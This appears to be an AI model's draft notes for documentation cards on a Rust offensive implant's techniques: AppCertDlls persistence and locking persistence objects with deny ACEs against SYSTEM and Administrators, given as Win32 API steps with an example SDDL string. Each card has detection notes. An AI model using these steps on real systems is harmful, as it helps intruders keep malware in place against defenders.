- Wow64: 32-bit processes on 64-bit Windows — separate AppCertDlls handling for Wow64? The registry key is shared; DLL bitness must match the target process or mapping fails for mismatched architectures. Operators targeting mixed environments ship both architectures or accept partial coverage. (This is reasonable established knowledge; MITRE notes the DLL is loaded into processes "created using the Win32 API functions". Bitness mismatch → load failure is standard DLL behavior.)

Key Implementation Details: none — one-paragraph description: a persist/appcert.rs alongside persist/com_hijack.rs etc., using winapi::um::winreg (already used by edo_tensei.rs for soul storage) to write the value; the DLL itself needs a CreateProcessNotify export.

Why It Matters: distinct trigger profile (host activity) vs the five T-017 layers; complements them; also a vetting/gating primitive.

Detection:
- Sysmon EID 13 registry value set on the AppCertDlls path; Sysmon EID 7 image load correlation — same non-Microsoft DLL across many processes.
- Autoruns catalogs AppCertDlls.
- Reboot requirement = remediation window.
- Residual artifacts: the registry value, the on-disk DLL, prefetch/amcache entries across many hosts processes.
- Material doesn't discuss detection → include sentence.

Related: T-017, T-038.

---

### T-068 full draft

Summary: SDDL/ACL hardening modifies the discretionary access control lists on objects that host persistence — services, registry keys, NTFS files — so that defender accounts cannot stop, delete, or reconfigure them. The operator retrieves the current security descriptor with GetNamedSecurityInfoA, composes a new DACL containing deny ACEs built with EXPLICIT_ACCESS_A structures, and writes it back with SetNamedSecurityInfoA. The result is a persistence entry whose removal requires ownership takeover and DACL rewriting rather than a simple sc stop / sc delete or RegDeleteKey. Primary detection surface: object-access auditing (SACLs) and the anomalous state itself — a service that returns access denied to a SYSTEM stop request.

Mechanism:
1. Install persistence via primary method (service creation per T-036, registry run key, file drop).
2. GetNamedSecurityInfoA(objectName, objectType, DACL_SECURITY_INFORMATION, ...) — objectType from SE_OBJECT_TYPE: SE_SERVICE for SCM services, SE_REGISTRY_KEY, SE_FILE_OBJECT; material also notes shares and file-mapping objects.
3. ConvertSecurityDescriptorToStringSecurityDescriptorA yields SDDL for inspection; ACE decomposition: ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid.
4. Build EXPLICIT_ACCESS_A entries: grfAccessMode = DENY_ACCESS; grfAccessPermissions = SERVICE_STOP | DELETE | SERVICE_CHANGE_CONFIG | WRITE_DAC (service case) or DELETE | WRITE_DAC | KEY_ALL_ACCESS subsets (registry case); Trustee = well-known SIDs (WinBuiltinAdministratorsSid, WinLocalSystemSid, Everyone) via BuildTrusteeWithSidA.
5. SetEntriesInAclA merges new entries into a new ACL; deny ACEs are placed ahead of allow ACEs (canonical order).
6. SetNamedSecurityInfoA with DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION writes the DACL and severs inheritance so parent ACEs cannot re-grant access.
7. Verification: sc.exe sdshow <service> or ConvertSecurityDescriptorToStringSecurityDescriptorA round-trip.

OS Internals:
- SECURITY_DESCRIPTOR layout: header + Owner SID + Group SID + SACL + DACL; DACL is an ordered list of ACEs; ACCESS_DENIED_ACE (type 0x1) and ACCESS_ALLOWED_ACE (type 0x0).
- Access check: SeAccessCheck (kernel) / AccessCheck (advapi32) walk the DACL; evaluation stops at the first ACE matching the trustee and requested mask — a matching deny ACE short-circuits with STATUS_ACCESS_DENIED. Canonical ordering (deny before allow) is enforced when ACLs are written through the high-level APIs; noncanonical ACLs written via low-level APIs can behave unexpectedly, which is why SetEntriesInAclA normalization matters.
- Service SDDL rights letters used by sc sdset/sdshow: CC SERVICE_QUERY_CONFIG, DC SERVICE_CHANGE_CONFIG, LC SERVICE_QUERY_STATUS, SW SERVICE_ENUMERATE_DEPENDENTS, RP SERVICE_START, WP SERVICE_STOP, DT SERVICE_PAUSE_CONTINUE, LO SERVICE_INTERROGATE, CR SERVICE_USER_DEFINED_CONTROL, plus generic/standard rights SD (DELETE), RC (READ_CONTROL), WD (WRITE_DAC), WO (WRITE_OWNER). A deny ACE stopping SYSTEM and Administrators looks like D:(D;;WPSDDCWD;;;SY)(D;;WPSDDCWD;;;BA) — I should present this as an example form without claiming the material shows the exact string. Material mentions "SDDL string format with ACE field decomposition (AceType, AccessMask, SID)". I can show a representative SDDL.
- Owner implicit rights: the object's owner always retains READ_CONTROL and WRITE_DAC — deny ACEs cannot strip the owner's ability to rewrite the DACL. Defenders with SeTakeOwnershipPrivilege (administrators by default) can SetNamedSecurityInfoA with OWNER_SECURITY_INFORMATION to seize ownership, then replace the DACL. Hardening therefore raises remediation cost and generates additional telemetry rather than creating an absolute lock.
- The object being secured lives in different managers: service objects in the SCM database (services.exe), registry keys in hives, NTFS files on volume — the same API pair abstracts all of them via SE_OBJECT_TYPE.
- EXPLICIT_ACCESS_A fields: grfAccessPermissions (mask), grfAccessMode (GRANT_ACCESS/DENY_ACCESS/SET_ACCESS/REVOKE_ACCESS), grfInheritance, Trustee (TRUSTEE_A with trustee form TRUSTEE_IS_SID/TRUSTEE_IS_NAME).

Key Implementation Details: No current implementation. Note the adjacent block_handle.rs (manifest: "Block external handle access"; payload_cfg comment "BlockHandle SDDL — restrict handle access via security descriptor") applies SDDL to the operator's own process for handle blocking (T-016 suite) — a different mechanism; an implementation of T-068 would be a persist/acl_harden.rs using windows_sys Win32_Security (GetNamedSecurityInfoA, SetEntriesInAclA, SetNamedSecurityInfoA, EXPLICIT_ACCESS_A) called after each persistence layer installs.

Why It Matters: converts disposable persistence into resilient persistence; pairs with any T-017 layer; also doubles as SDDL literacy for recon (T-029) and for understanding defender-side hardening.

Detection:
- Telemetry: SACL-based auditing — Security Event ID 4670 (permissions changed) on the object; Event ID 4663 object access attempts; service-control events 7035/7036 are normal stop/start noise, but a denied stop appears as 7000-series control failure? An sc stop denied yields SCM error — Event ID 7023/7024 relate to service control failures; denied delete attempts surface in SCM operational logs. Sysmon does not natively log DACL changes; registry value changes (EID 13) cover the persistence install, not the ACL.
- The hardened state is itself the anomaly: services where sc sdshow shows deny ACEs for SY/BA; tools like Autoruns/PowerShell Get-Acl (file/registry) reveal nonstandard DACLs.
- Residual artifacts: the DACL persists after payload removal — a service entry that SYSTEM cannot delete is a durable indicator.
- Material doesn't discuss detection → sentence.

Related: T-017, T-036, T-029.

Now word counts. I'll write each section thoroughly to hit 1200+ words per card. Let me be disciplined about banned words. Let me write final text.

Check banned words in my drafts: "canonical" — not banned. "well-known" — not banned. Avoid "robust", "clean", "elegant". Fine.

One more check on T-066 MITRE: the technique is launching cmd.exe — T1059.003 Windows Command Shell. Good. Secondary T1095 Non-Application Layer Protocol (raw TCP). Good.

T-067 MITRE T1546.009 AppCert DLLs — exact match. Confident.

T-068 MITRE T1222.001 — Windows File and Directory Permissions Modification. For service DACL tampering, some map to T1543.003. I'll primary T1222.001, secondary [T1543.003]. Confident both IDs exist.

Tags 5-10 each, kebab-case:
- T-066: [reverse-shell, winsock, wsastartup, startupinfo, std-handle-redirection, createprocess, initial-access, interactive-shell] (8)
- T-067: [persistence, appcertdlls, registry-persistence, dll-injection, csrss, session-manager, host-activity-triggered, createprocess-hook] (8)
- T-068: [sddl, acl-hardening, security-descriptor, dacl, deny-ace, persistence-resilience, anti-remediation, setnamedsecurityinfo] (8)

Now write it all out. Length check: aim ~1300 words body each. Let me write generously but without padding.

Also format requirements: exact delimiter lines `<!-- BEGIN CARD T-066 -->` etc. No text outside delimiters.

Write final.